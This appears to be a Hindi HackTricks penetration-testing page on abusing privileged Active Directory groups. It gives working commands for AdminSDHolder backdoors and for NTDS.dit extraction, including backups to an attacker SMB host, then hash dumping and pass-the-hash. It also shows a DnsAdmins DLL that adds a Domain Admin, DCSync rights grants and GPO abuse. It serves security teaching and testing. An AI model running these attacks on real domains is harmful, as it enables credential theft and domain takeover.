# विशेषाधिकार प्राप्त समूह

{{#include ../../banners/hacktricks-training.md}}

## प्रशासनिक विशेषाधिकारों वाले प्रसिद्ध समूह

- **Administrators**
- **Domain Admins**
- **Enterprise Admins**

## Account Operators

इस समूह को ऐसे खाते और समूह बनाने का अधिकार है जो डोमेन पर administrator नहीं हैं। इसके अतिरिक्त, यह Domain Controller (DC) पर स्थानीय लॉगिन की अनुमति देता है।

इस समूह के सदस्यों की पहचान करने के लिए, निम्नलिखित कमांड चलाया जाता है:

```bash
Get-NetGroupMember -Identity "Account Operators" -Recurse
```

नए users जोड़ने की अनुमति है, साथ ही DC में local login की भी।<sup>[[1]](#references)</sup>

Account management से local administrator access तक का एक conditional path है: **ऐसा ordinary group जिसे किसी computer का LAPS password पढ़ने के लिए delegate किया गया हो**। उस exact group पर effective membership-write rights की जाँच करें, देखें कि वह protected है या नहीं, और क्या कोई नया या controlled account वास्तव में उसमें शामिल हो सकता है। Target computer की LAPS read permission जाँचने से पहले account का token refresh करें। Encrypted Windows LAPS के लिए directory read permission और password-decryption authority अलग-अलग आवश्यकताएँ हैं; केवल group membership या Account Operators membership से इनमें से किसी का होना साबित नहीं होता। [Microsoft का Account Operators scope](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-groups) और [Windows LAPS delegation](https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-scenarios-windows-server-active-directory) देखें।

## AdminSDHolder समूह

**AdminSDHolder** group की Access Control List (ACL) महत्वपूर्ण है, क्योंकि यह Active Directory के सभी "protected groups", जिनमें high-privilege groups भी शामिल हैं, के permissions सेट करती है। यह mechanism अनधिकृत बदलावों को रोककर इन groups की सुरक्षा सुनिश्चित करता है।

कोई attacker **AdminSDHolder** group की ACL में बदलाव करके इसका दुरुपयोग कर सकता है और किसी standard user को full permissions दे सकता है। इससे उस user को सभी protected groups पर full control मिल जाएगा। यदि इस user के permissions बदले या हटाए जाते हैं, तो system के design के कारण वे एक घंटे के भीतर अपने-आप फिर से लागू हो जाएंगे।<sup>[[14]](#references)</sup>

Windows Server का हालिया documentation अब भी कई built-in operator groups को **protected** objects मानता है (`Account Operators`, `Backup Operators`, `Print Operators`, `Server Operators`, `Domain Admins`, `Enterprise Admins`, `Key Admins`, `Enterprise Key Admins` आदि)। **SDProp** process default रूप से हर 60 मिनट में **PDC Emulator** पर चलता है, `adminCount=1` सेट करता है, और protected objects पर inheritance बंद कर देता है। यह persistence के लिए उपयोगी है, और उन stale privileged users को ढूँढ़ने के लिए भी जिन्हें protected group से हटाया गया था, लेकिन जिनकी ACL अब भी non-inheriting है।<sup>[[12]](#references)</sup>

Members की समीक्षा और permissions में बदलाव करने के commands में शामिल हैं:

```bash
Get-NetGroupMember -Identity "AdminSDHolder" -Recurse
Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=testlab,DC=local' -PrincipalIdentity matt -Rights All
Get-ObjectAcl -SamAccountName "Domain Admins" -ResolveGUIDs | ?{$_.IdentityReference -match 'spotless'}
```

```powershell
# Hunt users/groups that still have adminCount=1
Get-ADObject -LDAPFilter '(adminCount=1)' -Properties adminCount,distinguishedName |
  Select-Object distinguishedName
```

प्रक्रिया को तेज़ करने के लिए एक script उपलब्ध है: [Invoke-ADSDPropagation.ps1](https://github.com/edemilliere/ADSI/blob/master/Invoke-ADSDPropagation.ps1).

अधिक जानकारी के लिए, [ired.team](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/how-to-abuse-and-backdoor-adminsdholder-to-obtain-domain-admin-persistence) देखें।<sup>[[14]](#references)</sup>

## AD Recycle Bin

हटाए गए objects की दृश्यता effective directory permissions से नियंत्रित होती है; केवल group name से यह साबित नहीं होता कि वर्तमान identity किसी object को सूचीबद्ध या restore कर सकती है। पूर्ण restore के लिए, deletion से पहले AD Recycle Bin enabled होना चाहिए। Restore करने के लिए naming-context root पर Reanimate-Tombstones, rename rights और destination container पर CREATE_CHILD भी आवश्यक हैं। [Microsoft's Recycle Bin guidance](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/get-started/adac/active-directory-recycle-bin) और [undelete authorization rules](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/c7279698-8aed-4e0b-b750-97c29f11b004) इन शर्तों में अंतर स्पष्ट करते हैं। Deleted-object read access वाली अधिकृत identity उन records की जाँच कर सकती है जिनसे संवेदनशील जानकारी उजागर हो सकती है:

```bash
Get-ADObject -filter 'isDeleted -eq $true' -includeDeletedObjects -Properties *
```

यह **पिछले privilege paths को पुनर्प्राप्त करने** के लिए उपयोगी है। हटाए गए objects में अब भी `lastKnownParent`, `memberOf`, `sIDHistory`, `adminCount`, पुराने SPNs या हटाए गए privileged group का DN मौजूद हो सकता है, जिसे बाद में कोई अन्य operator restore कर सकता है।

किसी object के deleted state में रहने के दौरान application-defined attributes में पुराना credential material भी बना रह सकता है। इसे अलग review lead मानें: वर्तमान identity को deleted object enumerate करने **और** उस attribute को read करने की अनुमति होनी चाहिए, value उपयोगी credential होनी चाहिए, और किसी अभी-active principal को उसे स्वीकार करना चाहिए। केवल group membership या हटाए गए account का नाम इनमें से किसी भी चरण को साबित नहीं करता; routine enumeration के दौरान credential values प्रिंट करने से बचें। [Microsoft's Recycle Bin documentation](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/get-started/adac/active-directory-recycle-bin) deletion के बाद attributes के संरक्षण का वर्णन करता है।

```powershell
Get-ADObject -Filter 'isDeleted -eq $true' -IncludeDeletedObjects `
  -Properties samAccountName,lastKnownParent,memberOf,sIDHistory,adminCount,servicePrincipalName |
  Select-Object samAccountName,lastKnownParent,adminCount,sIDHistory,servicePrincipalName
```

### Domain Controller तक पहुंच

DC पर फ़ाइलों तक पहुंच प्रतिबंधित है, जब तक कि उपयोगकर्ता `Server Operators` समूह का सदस्य न हो। इसका सदस्य होने से पहुंच का स्तर बदल जाता है।

### Privilege Escalation

Sysinternals के `PsService` या `sc` का उपयोग करके, service permissions की जांच और उनमें बदलाव किया जा सकता है। उदाहरण के लिए, `Server Operators` समूह को कुछ services पर पूर्ण नियंत्रण प्राप्त होता है, जिससे मनमाने commands चलाना और privilege escalation करना संभव होता है:<sup>[[1]](#references)</sup>

```cmd
C:\> .\PsService.exe security AppReadiness
```

यह कमांड दिखाता है कि `Server Operators` के पास पूर्ण access है, जिससे वे elevated privileges पाने के लिए services में बदलाव कर सकते हैं।

## Backup Operators

`Backup Operators` की सदस्यता से किसी host पर `SeBackupPrivilege` और `SeRestorePrivilege` मिल सकते हैं; यह उसकी local policy और logon session पर निर्भर करता है। `whoami /groups` और `whoami /priv` से **commands चलाने वाली process के effective token** की जाँच करें: केवल सदस्यता होने से यह साबित नहीं होता कि `SeBackupPrivilege` मौजूद और enabled है। अगर privilege मौजूद है, लेकिन disabled है, तो उसे उस token में enable किया जा सकता है; अगर वह अनुपस्थित या हटाया गया है, तो backup operations उसका उपयोग नहीं कर सकते। `SeBackupPrivilege`, backup-aware APIs (उदाहरण के लिए, `FILE_FLAG_BACKUP_SEMANTICS` या `robocopy /B`) के ज़रिए सुरक्षित **reads** को support करता है; `SeRestorePrivilege`, restore/write operations के लिए एक अलग privilege है। सामान्य directory listings और copies में backup semantics का उपयोग होना ज़रूरी नहीं है।<sup>[[1]](#references)</sup>

Group members की सूची पाने के लिए, यह चलाएँ:

```bash
Get-NetGroupMember -Identity "Backup Operators" -Recurse
```

### स्थानीय हमला

जिस host पर effective token में `SeBackupPrivilege` हो, वहाँ निम्न backup-aware copy संरक्षित फ़ाइल को पढ़ सकती है:

1. ज़रूरी libraries इंपोर्ट करें:

```bash
Import-Module .\SeBackupPrivilegeUtils.dll
Import-Module .\SeBackupPrivilegeCmdLets.dll
```

2. यदि privilege मौजूद है लेकिन disabled है, तो इसे enable करें और इस process में इसकी state verify करें:

```bash
Set-SeBackupPrivilege
Get-SeBackupPrivilege
```

3. उदाहरण के लिए, restricted directory से कोई file copy करें:

```bash
dir C:\Users\Administrator\
Copy-FileSeBackupPrivilege C:\Users\Administrator\report.pdf c:\temp\x.pdf -Overwrite
```

### AD Attack

`NTDS.dit` **domain controller (DC)** पर Active Directory database है। इस तरीके के लिए DC पर उपयुक्त token और database वाली volume तक पहुँच आवश्यक है; कहीं और Backup Operators की सदस्यता से किसी विशेष DC तक पहुँच नहीं मिलती। Live database आमतौर पर locked होती है, इसलिए इसे copy करने से पहले उपलब्ध shadow copy या किसी अन्य backup facility का उपयोग करें। Shadow copy बनाना या उसे उपलब्ध कराना host के VSS configuration और caller के अधिकारों पर भी निर्भर करता है। नीचे दिया गया उदाहरण मानता है कि DC पर `NTDS.dit` `C:` में `\Windows\NTDS` के अंतर्गत है; अगर ऐसा नहीं है, तो volume और path बदलें।

#### diskshadow.exe का उपयोग

1. यदि अनुमति हो, तो DC की `C:` drive की shadow copy बनाएँ और उसे `F:` के रूप में उपलब्ध कराएँ:

```cmd
diskshadow.exe
set verbose on
set metadata C:\Windows\Temp\meta.cab
set context clientaccessible
begin backup
add volume C: alias cdrive
create
expose %cdrive% F:
end backup
exit
```

2. Shadow copy से `NTDS.dit` कॉपी करें:

```cmd
mkdir C:\Tools
Copy-FileSeBackupPrivilege F:\Windows\NTDS\ntds.dit C:\Tools\ntds.dit
```

वैकल्पिक रूप से, फ़ाइलें कॉपी करने के लिए `robocopy` का उपयोग करें:

```cmd
robocopy /B F:\Windows\NTDS C:\Tools ntds.dit
```

3. Offline extraction के लिए DC का `SYSTEM` hive सेव करें। `SAM` member systems पर local account database होता है; DC का `SAM` hive, `NTDS.dit` का विकल्प या domain Administrator hash का स्रोत नहीं है:

```cmd
reg save HKLM\SYSTEM C:\Tools\SYSTEM.SAV
```

4. `ntds.dit` और `SYSTEM.SAV` को analysis host पर भेजें और domain account hashes निकालें। किसी member system से सेव की गई `SAM` hive और उससे मेल खाने वाली `SYSTEM` hive से इसके बजाय local account hashes मिलते हैं:

```shell-session
secretsdump.py -ntds ntds.dit -system SYSTEM.SAV LOCAL
```

5. यदि `NTDS.dit` से **domain** Administrator hash प्राप्त हुआ है, तो इसे domain authentication के लिए जांचा जा सकता है। `SAM.SAV` से मिला local Administrator hash एक अलग credential है और इससे domain Administrator के रूप में authentication नहीं किया जा सकता।<sup>[[11]](#references)</sup>

```bash
# Use the recovered domain Administrator NT hash to authenticate without the cleartext password
netexec winrm <DC_FQDN> -d <DOMAIN> -u Administrator -H <ADMIN_NT_HASH> -x "whoami"

# Or execute via SMB using an exec method
netexec smb <DC_FQDN> -d <DOMAIN> -u Administrator -H <ADMIN_NT_HASH> --exec-method smbexec -x cmd
```

#### wbadmin.exe का उपयोग

1. Attacker मशीन पर SMB server के लिए NTFS filesystem सेट अप करें और target मशीन पर SMB credentials कैश करें।
2. System backup और `NTDS.dit` extraction के लिए `wbadmin.exe` का उपयोग करें:
   ```cmd
   net use X: \\<AttackIP>\sharename /user:smbuser password
   echo "Y" | wbadmin start backup -backuptarget:\\<AttackIP>\sharename -include:c:\windows\ntds
   wbadmin get versions
   echo "Y" | wbadmin start recovery -version:<date-time> -itemtype:file -items:c:\windows\ntds\ntds.dit -recoverytarget:C:\ -notrestoreacl
   ```

व्यावहारिक प्रदर्शन के लिए, देखें [DEMO VIDEO WITH IPPSEC](https://www.youtube.com/watch?v=IfCysW0Od8w&t=2610s)।

## DnsAdmins

**DnsAdmins** समूह के सदस्य अपने विशेषाधिकारों का दुरुपयोग करके DNS सर्वर पर SYSTEM विशेषाधिकारों के साथ कोई भी DLL लोड कर सकते हैं। DNS सर्वर अक्सर Domain Controllers पर होस्ट किए जाते हैं। इस क्षमता से शोषण की व्यापक संभावनाएँ पैदा होती हैं।

DnsAdmins समूह के सदस्यों की सूची देखने के लिए, यह उपयोग करें:

```bash
Get-NetGroupMember -Identity "DnsAdmins" -Recurse
```

### Execute arbitrary DLL (CVE‑2021‑40469)

> [!NOTE]
> यह vulnerability DNS service (आमतौर पर DCs के अंदर) में SYSTEM privileges के साथ arbitrary code execute करने की अनुमति देती है। इस समस्या को 2021 में ठीक किया गया था।

Members निम्नलिखित जैसे commands का उपयोग करके DNS server से arbitrary DLL (या तो locally या remote share से) load करवा सकते हैं:

```bash
dnscmd [dc.computername] /config /serverlevelplugindll c:\path\to\DNSAdmin-DLL.dll
dnscmd [dc.computername] /config /serverlevelplugindll \\1.2.3.4\share\DNSAdmin-DLL.dll
An attacker could modify the DLL to add a user to the Domain Admins group or execute other commands with SYSTEM privileges. Example DLL modification and msfvenom usage:

# If dnscmd is not installed run from aprivileged PowerShell session:
Install-WindowsFeature -Name RSAT-DNS-Server -IncludeManagementTools
```

```c
// Modify DLL to add user
DWORD WINAPI DnsPluginInitialize(PVOID pDnsAllocateFunction, PVOID pDnsFreeFunction)
{
    system("C:\\Windows\\System32\\net.exe user Hacker T0T4llyrAndOm... /add /domain");
    system("C:\\Windows\\System32\\net.exe group \"Domain Admins\" Hacker /add /domain");
}
```

```bash
// Generate DLL with msfvenom
msfvenom -p windows/x64/exec cmd='net group "domain admins" <username> /add /domain' -f dll -o adduser.dll
```

DLL को लोड करने के लिए DNS service को रीस्टार्ट करना आवश्यक है (जिसके लिए अतिरिक्त permissions की आवश्यकता हो सकती है):

```csharp
sc.exe \\dc01 stop dns
sc.exe \\dc01 start dns
```

इस attack vector के बारे में अधिक जानकारी के लिए ired.team देखें।

#### Mimilib.dll

Command execution के लिए mimilib.dll का उपयोग करना भी संभव है। इसे specific commands या reverse shells execute करने के लिए modify किया जा सकता है। अधिक जानकारी के लिए [यह पोस्ट देखें](https://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html)।<sup>[[15]](#references)</sup>

### MitM के लिए WPAD Record

DnsAdmins, global query block list को disable करने के बाद WPAD record बनाकर DNS records में बदलाव कर सकते हैं और Man-in-the-Middle (MitM) attacks कर सकते हैं। Network traffic को spoof और capture करने के लिए Responder या Inveigh जैसे tools का उपयोग किया जा सकता है।

### Event Log Readers
Members event logs तक पहुंच सकते हैं और उनमें plaintext passwords या command execution details जैसी sensitive information खोज सकते हैं:

```bash
# Get members and search logs for sensitive information
Get-NetGroupMember -Identity "Event Log Readers" -Recurse
Get-WinEvent -LogName security | where { $_.ID -eq 4688 -and $_.Properties[8].Value -like '*/user*'}
```

## Exchange Windows Permissions

यह समूह domain object पर DACLs को संशोधित कर सकता है, जिससे संभावित रूप से DCSync privileges मिल सकते हैं। इस समूह का फ़ायदा उठाकर privilege escalation करने की तकनीकों का विवरण Exchange-AD-Privesc GitHub repo में दिया गया है।

```bash
# List members
Get-NetGroupMember -Identity "Exchange Windows Permissions" -Recurse
```

यदि आप इस group के सदस्य के रूप में कार्य कर सकते हैं, तो इसका पारंपरिक दुरुपयोग attacker-controlled principal को [DCSync](dcsync.md) के लिए आवश्यक replication rights देना है:

```bash
Add-DomainObjectAcl -TargetIdentity "DC=testlab,DC=local" -PrincipalIdentity attacker -Rights DCSync
Get-ObjectAcl -DistinguishedName "DC=testlab,DC=local" -ResolveGUIDs | ?{$_.IdentityReference -match 'attacker'}
```

ऐतिहासिक रूप से, **PrivExchange** ने mailbox access, coerced Exchange authentication और LDAP relay को जोड़कर इसी primitive तक पहुँच बनाई। भले ही उस relay path को mitigate कर दिया गया हो, `Exchange Windows Permissions` की सीधी membership या Exchange server पर नियंत्रण, domain replication rights हासिल करने का एक बेहद मूल्यवान रास्ता बना रहता है।

## Hyper-V Administrators

Hyper-V Administrators के पास Hyper-V का पूरा access होता है, जिसका फ़ायदा virtualized Domain Controllers पर नियंत्रण पाने के लिए उठाया जा सकता है। इसमें live DCs को clone करना और NTDS.dit file से NTLM hashes निकालना शामिल है।

### Exploitation का उदाहरण

आम तौर पर, व्यावहारिक दुरुपयोग पुराने host-level LPE तरीकों के बजाय **DC disks/checkpoints तक offline access** हासिल करने पर निर्भर करता है। Hyper-V host तक access होने पर, operator किसी virtualized Domain Controller का checkpoint बना सकता है या उसे export कर सकता है, VHDX को mount कर सकता है और guest के अंदर LSASS को छुए बिना `NTDS.dit`, `SYSTEM` और अन्य secrets निकाल सकता है:

```bash
# Host-side enumeration
Get-VM
Get-VHD -VMId <vm-guid>

# After exporting or checkpointing the DC, mount the disk read-only
Mount-VHD -Path 'C:\HyperV\Virtual Hard Disks\DC01.vhdx' -ReadOnly
```

वहाँ से, `Windows\NTDS\ntds.dit` और registry hives को offline कॉपी करने के लिए `Backup Operators` workflow का फिर से उपयोग करें। संबंधित backup-file workflow:

{{#ref}}
../../network-services-pentesting/pentesting-veeam-backup-and-replication.md
{{#endref}}

## Group Policy Creators Owners	

यह group सदस्यों को domain में Group Policies बनाने की अनुमति देता है। हालांकि, इसके सदस्य users या groups पर group policies लागू नहीं कर सकते और न ही मौजूदा GPOs edit कर सकते हैं।

महत्वपूर्ण बात यह है कि **नए GPO का owner उसका creator बनता है** और आमतौर पर उसे बाद में उसे edit करने के लिए पर्याप्त अधिकार मिल जाते हैं। इसका मतलब है कि यह group तब उपयोगी है, जब आप इनमें से कोई काम कर सकते हों:

- एक malicious GPO बनाएं और किसी admin को उसे target OU/domain से link करने के लिए मनाएं
- अपने बनाए ऐसे GPO को edit करें जो पहले से किसी उपयोगी जगह link हो
- किसी अन्य delegated right का दुरुपयोग करें, जिससे आप GPOs link कर सकें, जबकि यह group आपको उन्हें edit करने की क्षमता देता है

व्यावहारिक दुरुपयोग में आमतौर पर SYSVOL-backed policy files के ज़रिए **Immediate Task**, **startup script**, **local admin membership**, या **user rights assignment** में बदलाव करना शामिल होता है।<sup>[[3]](#references)[[4]](#references)[[13]](#references)[[16]](#references)</sup>

```bash
# Example with SharpGPOAbuse: add an immediate task that executes as SYSTEM
SharpGPOAbuse.exe --AddImmediateTask --TaskName "HT-Task" --Author TESTLAB\\Administrator --Command "cmd.exe" --Arguments "/c whoami > C:\\Windows\\Temp\\gpo.txt" --GPOName "Security Update"
```

यदि `SYSVOL` के माध्यम से GPO को मैन्युअल रूप से संपादित कर रहे हैं, तो याद रखें कि केवल बदलाव करना पर्याप्त नहीं है: `versionNumber`, `GPT.ini`, और कभी-कभी `gPCMachineExtensionNames` को भी अपडेट करना होगा, अन्यथा क्लाइंट policy refresh को अनदेखा कर देंगे।<sup>[[9]](#references)</sup>

## Organization Management

जिन वातावरणों में **Microsoft Exchange** तैनात है, वहाँ **Organization Management** नाम का एक विशेष समूह महत्वपूर्ण क्षमताएँ रखता है। इस समूह को **सभी domain users के mailboxes तक पहुँचने** का विशेषाधिकार प्राप्त है और इसका **'Microsoft Exchange Security Groups'** Organizational Unit (OU) पर **पूरा नियंत्रण** है। इस नियंत्रण में **`Exchange Windows Permissions`** समूह भी शामिल है, जिसका उपयोग privilege escalation के लिए किया जा सकता है।

### Privilege Exploitation और Commands

#### Print Operators

**Print Operators** समूह के सदस्यों को कई privileges प्राप्त होते हैं, जिनमें **`SeLoadDriverPrivilege`** भी शामिल है। इसकी मदद से वे **Domain Controller पर स्थानीय रूप से log on कर सकते हैं**, उसे बंद कर सकते हैं और printers manage कर सकते हैं। इन privileges का फायदा उठाने के लिए, खासकर जब **`SeLoadDriverPrivilege`** unelevated context में दिखाई न दे, User Account Control (UAC) को bypass करना आवश्यक है।<sup>[[1]](#references)</sup>

इस समूह के सदस्यों की सूची देखने के लिए, निम्नलिखित PowerShell command का उपयोग किया जाता है:

```bash
Get-NetGroupMember -Identity "Print Operators" -Recurse
```

Domain Controllers पर यह group खतरनाक है, क्योंकि default Domain Controller Policy, `Print Operators` को **`SeLoadDriverPrivilege`** देता है। अगर आपको इस group के किसी सदस्य का elevated token मिल जाता है, तो आप privilege को enable करके kernel/SYSTEM तक पहुंचने के लिए signed-but-vulnerable driver load कर सकते हैं।<sup>[[2]](#references)[[5]](#references)[[6]](#references)[[7]](#references)[[8]](#references)[[10]](#references)[[17]](#references)</sup> Token handling की जानकारी के लिए [Access Tokens](../windows-local-privilege-escalation/access-tokens.md) देखें।

#### Remote Desktop Users

इस group के सदस्यों को Remote Desktop Protocol (RDP) के ज़रिए PCs का access दिया जाता है। इन सदस्यों की enumeration के लिए PowerShell commands उपलब्ध हैं:

```bash
Get-NetGroupMember -Identity "Remote Desktop Users" -Recurse
Get-NetLocalGroupMember -ComputerName <pc name> -GroupName "Remote Desktop Users"
```

RDP का exploit करने के बारे में अधिक जानकारी विशेष pentesting संसाधनों में मिल सकती है।

#### Remote Management Users

इस समूह के सदस्य **Windows Remote Management (WinRM)** के ज़रिए PCs को access कर सकते हैं। इन सदस्यों की enumeration इस तरह की जाती है:

```bash
Get-NetGroupMember -Identity "Remote Management Users" -Recurse
Get-NetLocalGroupMember -ComputerName <pc name> -GroupName "Remote Management Users"
```

WinRM से संबंधित exploitation techniques के लिए, विशिष्ट documentation देखना चाहिए।

#### Server Operators

इस group के पास Domain Controllers पर विभिन्न configurations करने की permissions होती हैं, जिनमें backup और restore privileges, system time बदलना और system shutdown करना शामिल है।<sup>[[1]](#references)</sup> सदस्यों की enumeration के लिए यह command दिया गया है:

```bash
Get-NetGroupMember -Identity "Server Operators" -Recurse
```

Domain Controllers पर, `Server Operators` को आम तौर पर **services को reconfigure करने या start/stop करने** के लिए पर्याप्त अधिकार विरासत में मिलते हैं और default DC policy के ज़रिए उन्हें `SeBackupPrivilege`/`SeRestorePrivilege` भी मिलते हैं। व्यवहार में, इससे वे **service-control abuse** और **NTDS extraction** के बीच एक पुल बन जाते हैं:

```cmd
sc.exe \\dc01 query
sc.exe \\dc01 qc <service>
.\PsService.exe security <service>
```

किसी service की सूची न बना पाना, किसी **known service** तक पहुँच को खारिज नहीं करता। Service Control Manager, सेवाओं की सूची बनाने के लिए `SC_MANAGER_ENUMERATE_SERVICE` की जाँच `SC_MANAGER_CONNECT` से अलग करता है; किसी नामित service को खोलने पर उसके अपने अधिकारों की जाँच होती है, जिनमें `SERVICE_CHANGE_CONFIG` और `SERVICE_START` शामिल हैं। सामान्य `sc.exe query` विफल होने पर भी effective token और उस service की ACL की समीक्षा करें। केवल configuration rights होना बस एक संभावना है: higher-privilege transition संभव है या नहीं, यह service identity, start/stop rights और उपयोगी trigger पर भी निर्भर करता है। [Microsoft के service access-rights संदर्भ](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights) देखें।

यदि service ACL इस group को change/start rights देती है, तो service को arbitrary command पर सेट करें, उसे `LocalSystem` के रूप में start करें, फिर मूल `binPath` बहाल करें। यदि service control पर रोक हो, तो `NTDS.dit` कॉपी करने के लिए ऊपर बताई गई `Backup Operators` techniques अपनाएँ।

## References

- [1] [ired.team – Privileged Accounts और Token Privileges](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)
- [2] [Tarlogic – Privilege Escalation के लिए SeLoadDriverPrivilege का दुरुपयोग](https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/)
- [3] [harmj0y – GPO Permissions का दुरुपयोग](https://blog.harmj0y.net/redteaming/abusing-gpo-permissions/)
- [4] [rastamouse – GPO Abuse, भाग 1 (Internet Archive)](https://web.archive.org/web/20190416075109/https://rastamouse.me/2019/01/gpo-abuse-part-1/)
- [5] [killswitch-GUI – HotLoad-Driver (ntloaddriver.cpp)](https://github.com/killswitch-GUI/HotLoad-Driver/blob/master/NtLoadDriver/EXE/NtLoadDriver-C%2B%2B/ntloaddriver.cpp#L13)
- [6] [tandasat – ExploitCapcom](https://github.com/tandasat/ExploitCapcom)
- [7] [TarlogicSecurity – EoPLoadDriver (eoploaddriver.cpp)](https://github.com/TarlogicSecurity/EoPLoadDriver/blob/master/eoploaddriver.cpp)
- [8] [FuzzySecurity – Capcom-Rootkit (Capcom.sys)](https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys)
- [9] [SpecterOps – GPOs और OUs के लिए Red Teamer की मार्गदर्शिका](https://posts.specterops.io/a-red-teamers-guide-to-gpos-and-ous-f0d03976a31e)
- [10] [Microsoft Learn – ZwLoadDriver function](https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-zwloaddriver)
- [11] [HTB: Baby — Anonymous LDAP → Password Spray → SeBackupPrivilege → Domain Admin](https://0xdf.gitlab.io/2025/09/19/htb-baby.html)
- [12] [Microsoft Learn – परिशिष्ट C: Active Directory में Protected Accounts और Groups](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-c--protected-accounts-and-groups-in-active-directory)
- [13] [WithSecure Labs – SharpGPOAbuse](https://labs.withsecure.com/tools/sharpgpoabuse)
- [14] [ired.team – Domain Admin Persistence पाने के लिए AdminSDHolder का दुरुपयोग और Backdoor कैसे करें](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/how-to-abuse-and-backdoor-adminsdholder-to-obtain-domain-admin-persistence)
- [15] [Lab of a Penetration Tester – Active Directory में Escalation के लिए DnsAdmins Privilege का दुरुपयोग](https://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html)
- [16] [BloodHound – GenericAll edge के दुरुपयोग की जानकारी](https://bloodhound.specterops.io/resources/edges/generic-all)
- [17] [Undocumented NT Internals – NtLoadDriver function (Internet Archive)](https://web.archive.org/web/20200313000124/http://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FExecutable%20Images%2FNtLoadDriver.html)
{{#include ../../banners/hacktricks-training.md}}
